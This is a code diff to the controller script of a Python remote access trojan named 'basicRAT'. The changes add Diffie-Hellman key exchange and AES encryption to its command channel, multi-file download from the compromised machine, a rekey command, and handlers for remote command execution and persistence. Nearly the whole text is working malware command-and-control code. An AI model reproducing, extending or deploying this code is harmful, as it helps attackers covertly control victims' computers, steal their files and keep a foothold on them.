@@ -9,8 +9,16 @@
 import argparse
 import readline
 import socket
-import sys
+import struct
 import time
+import sys
+
+from core import common
+from core.crypto import diffiehellman
+
+# temporary
+from core.crypto import AES_encrypt as encrypt
+from core.crypto import AES_decrypt as decrypt
 
 
 # ascii banner (Crawford2) - http://patorjk.com/software/taag/
@@ -72,12 +80,14 @@ def main():
 
     s.listen(10)
     conn, addr = s.accept()
-
+    DHKEY = diffiehellman(conn, server=True)
+    #print binascii.hexlify(DHKEY) #debug: confirm DHKEY matches
+    
     while True:
-        prompt = raw_input('[{}] basicRAT> '.format(addr[0])).rstrip()
+        prompt = raw_input('[{0}] basicRAT> '.format(addr[0])).rstrip()
 
-        # allow noop
-        if not prompt:
+        # allow no-op
+        if not prompt: 
             continue
 
         # seperate prompt into command and action
@@ -89,7 +99,7 @@ def main():
             continue
 
         # send data to client
-        conn.send(encrypt(prompt))
+        conn.send(encrypt(prompt, DHKEY))
 
         # stop server
         if cmd == 'quit':
@@ -99,27 +109,36 @@ def main():
         # results of command
         elif cmd == 'run':
             recv_data = conn.recv(4096)
-            print decrypt(recv_data)
+            print decrypt(recv_data, DHKEY)
 
         # download a file
         elif cmd == 'download':
-            f_name = action.split()[0]
-
-            with open(f_name, 'wb') as f:
-                while True:
-                    recv_data = conn.recv(1024)
-                    if not recv_data:
-                        break
-                    f.write(decrypt(recv_data))
-
+            for fname in action.split():
+                fname = fname.strip()
+                
+                with open(fname, 'wb') as f:
+                    datasize = struct.unpack("!I", conn.recv(4))[0]
+                    while datasize:
+                        res = conn.recv(datasize)
+                        f.write(decrypt(res, DHKEY))
+                        datasize = struct.unpack("!I", conn.recv(4))[0]
+                   
+                    
+        # regenerate DH key (dangerous! may cause connection loss!)
+        # available in case a fallback occurs or you suspect eavesdropping
+        elif cmd == 'rekey':
+            DHKEY = diffiehellman(conn, server=True)
+            #print binascii.hexlify(DHKEY) #debug
+            
         # results of persistence
         elif cmd == 'persistence':
             print 'Applying persistence mechanism...'
             recv_data = conn.recv(1024)
-            print decrypt(recv_data)
+            print decrypt(recv_data, DHKEY)
 
         else:
-            print 'Invalid command.'
+            print "Invalid command"
+            print "Type 'help' to get a list of all commands"
 
 
 if __name__ == '__main__':
